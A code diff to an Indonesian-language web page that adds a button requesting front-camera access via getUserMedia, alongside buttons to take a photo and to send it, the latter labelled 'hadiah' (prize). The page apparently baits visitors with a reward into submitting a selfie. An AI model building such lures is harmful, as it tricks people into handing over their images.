@@ -30,10 +30,22 @@ button{
 </head>
 <body>
 
-<h2>Aktifkan Kamera</h2>
+<button onclick="startCamera()">Aktifkan Kamera</button>
 
-<video id="video" autoplay playsinline></video>
-<br>
+<script>
+async function startCamera(){
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    });
+    video.srcObject = stream;
+  } catch(err){
+    alert("Kamera gagal diakses atau izin ditolak");
+  }
+}
+</script>
+  
+
   <button onclick="takePhoto()">🦠💀🦠</button>
 <button onclick="sendPhoto()">hadiah</button>
 
